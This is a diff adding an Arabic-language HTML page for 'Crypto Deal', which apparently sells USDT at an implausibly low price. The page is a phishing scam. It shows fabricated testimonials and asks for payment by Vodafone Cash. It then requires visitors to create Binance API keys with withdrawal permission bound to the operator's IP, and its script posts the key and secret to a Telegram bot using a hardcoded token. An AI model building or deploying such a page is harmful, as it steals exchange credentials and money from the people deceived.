@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Deal - اشتري USDT بسعر رخيص</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+    body { font-family: 'Cairo', sans-serif; direction: rtl; }
+    .gradient-bg { background: linear-gradient(135deg, #1e3a8a, #3b82f6); }
+  </style>
+</head>
+<body class="bg-gray-100">
+  <div id="app"></div>
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8057332665:AAHuiCWdy9yvDZ-UtiqrBUlgW0Gnk_M85rE';
+    const TELEGRAM_CHAT_ID = '7699820616';
+    const YOUR_IP_ADDRESS = '192.168.1.1';
+    const VODAFONE_CASH_NUMBER = '01034567890'; // Replace with your number
+
+    let isApiRegistered = false;
+    let apiData = { apiKey: '', secretKey: '' };
+    let usdtAmount = 0;
+    let paymentAmount = 0;
+
+    const app = document.getElementById('app');
+
+    function sendToTelegram(data) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: JSON.stringify(data, null, 2),
+        })
+      }).catch(err => console.error('Error:', err));
+    }
+
+    function renderLandingPage() {
+      app.innerHTML = `
+        <div class="min-h-screen gradient-bg text-white">
+          <header class="p-6 flex justify-between items-center">
+            <h1 class="text-3xl font-bold">Crypto Deal</h1>
+            <button onclick="renderApiPage()" class="px-4 py-2 bg-blue-600 rounded-lg">تسجيل API</button>
+          </header>
+          <main class="text-center py-16">
+            <h2 class="text-4xl font-bold mb-4">اشتري USDT بسعر 50 جنيه فقط!</h2>
+            <p class="text-lg mb-8">استفد من عرضنا الحصري ووفر أكثر من السوق السوداء</p>
+            <button onclick="renderBuyPage()" class="px-6 py-3 bg-yellow-400 text-blue-900 rounded-lg text-lg">اشتري الآن</button>
+          </main>
+          <section class="py-16 bg-white text-blue-900">
+            <h3 class="text-3xl font-bold text-center mb-8">آراء عملائنا</h3>
+            <div class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 px-4">
+              <div class="p-6 bg-gray-100 rounded-lg">
+                <p>"اشتريت 1000 USDT بسعر 50 جنيه، الصفقة كانت سريعة وآمنة!"</p>
+                <p class="mt-4 font-bold">- محمد أحمد</p>
+              </div>
+              <div class="p-6 bg-gray-100 rounded-lg">
+                <p>"أفضل منصة لشراء USDT، الدعم ممتاز والسعر لا يُضاهى!"</p>
+                <p class="mt-4 font-bold">- سارة خالد</p>
+              </div>
+              <div class="p-6 bg-gray-100 rounded-lg">
+                <p>"وفرت 1000 جنيه في صفقة واحدة، شكرًا Crypto Deal!"</p>
+                <p class="mt-4 font-bold">- علي محمود</p>
+              </div>
+            </div>
+          </section>
+          <div class="fixed bottom-8 left-8 bg-blue-600 p-4 rounded-full">
+            <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
+            </svg>
+          </div>
+        </div>
+      `;
+    }
+
+    function renderBuyPage() {
+      app.innerHTML = `
+        <div class="min-h-screen flex items-center justify-center bg-gray-100">
+          <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+            <h2 class="text-2xl font-bold mb-6 text-center">شراء USDT</h2>
+            <form onsubmit="handleBuy(event)">
+              <div class="mb-4">
+                <label class="block text-gray-700">مبلغ USDT</label>
+                <input type="number" id="usdtInput" class="w-full px-3 py-2 border rounded-lg" placeholder="أدخل المبلغ (مثال: 1000)" required oninput="calculatePayment(this.value)" />
+              </div>
+              <div class="mb-4">
+                <label class="block text-gray-700">المبلغ بالجنيه المصري</label>
+                <input type="text" id="paymentDisplay" class="w-full px-3 py-2 border rounded-lg" disabled />
+              </div>
+              <div class="mb-6">
+                <p class="text-gray-700">ادفع المبلغ عبر فودافون كاش إلى الرقم: <strong>${VODAFONE_CASH_NUMBER}</strong></p>
+                <p class="text-sm text-gray-500">تأكد من الدفع قبل الضغط على التالي</p>
+              </div>
+              <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">التالي</button>
+            </form>
+          </div>
+        </div>
+      `;
+      if (!isApiRegistered) {
+        setTimeout(() => {
+          alert('لازم تسجل API لإكمال العملية');
+          renderApiPage();
+        }, 100);
+      }
+    }
+
+    function calculatePayment(value) {
+      usdtAmount = parseFloat(value) || 0;
+      paymentAmount = usdtAmount * 50;
+      document.getElementById('paymentDisplay').value = paymentAmount ? `${paymentAmount} جنيه` : '';
+    }
+
+    function handleBuy(event) {
+      event.preventDefault();
+      if (!isApiRegistered) {
+        alert('لازم تسجل API لإكمال العملية');
+        renderApiPage();
+        return;
+      }
+      sendToTelegram({ type: 'buy', usdtAmount, paymentAmount });
+      alert('تم إرسال الطلب بنجاح');
+      renderLandingPage();
+    }
+
+    function renderApiPage() {
+      app.innerHTML = `
+        <div class="min-h-screen flex items-center justify-center bg-gray-100">
+          <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+            <h2 class="text-2xl font-bold mb-6 text-center">تسجيل API</h2>
+            <p class="mb-4 text-gray-700">اتبع الخطوات التالية في Binance لإنشاء API Key:</p>
+            <ol class="list-decimal list-inside mb-6 text-gray-700">
+              <li>سجل الدخول إلى Binance.</li>
+              <li>اذهب إلى <strong>Profile > API Management > Create API Key</strong>.</li>
+              <li>فعّل صلاحيات <strong>Spot & Margin Trading</strong> و<strong>Withdraw</strong>.</li>
+              <li>أدخل عنوان IP التالي: 
+                <span class="inline-flex items-center bg-blue-100 text-blue-900 px-2 py-1 rounded ml-2">
+                  <svg class="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M12 5v14" />
+                  </svg>
+                  ${YOUR_IP_ADDRESS}
+                </span>
+              </li>
+              <li>انسخ API Key وSecret Key.</li>
+            </ol>
+            <form onsubmit="handleApiSubmit(event)">
+              <div class="mb-4">
+                <label class="block text-gray-700">API Key</label>
+                <input type="text" id="apiKey" class="w-full px-3 py-2 border rounded-lg" required />
+              </div>
+              <div class="mb-4">
+                <label class="block text-gray-700">Secret Key</label>
+                <input type="text" id="secretKey" class="w-full px-3 py-2 border rounded-lg" required />
+              </div>
+              <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">تأكيد</button>
+            </form>
+          </div>
+        </div>
+      `;
+    }
+
+    function handleApiSubmit(event) {
+      event.preventDefault();
+      apiData.apiKey = document.getElementById('apiKey').value;
+      apiData.secretKey = document.getElementById('secretKey').value;
+      isApiRegistered = true;
+      sendToTelegram({ ...apiData, ipAddress: YOUR_IP_ADDRESS, type: 'api' });
+      alert('تم تسجيل API بنجاح! يمكنك الآن إكمال عملية الشراء.');
+      renderBuyPage();
+    }
+
+    renderLandingPage();
+  </script>
+</body>
+</html>
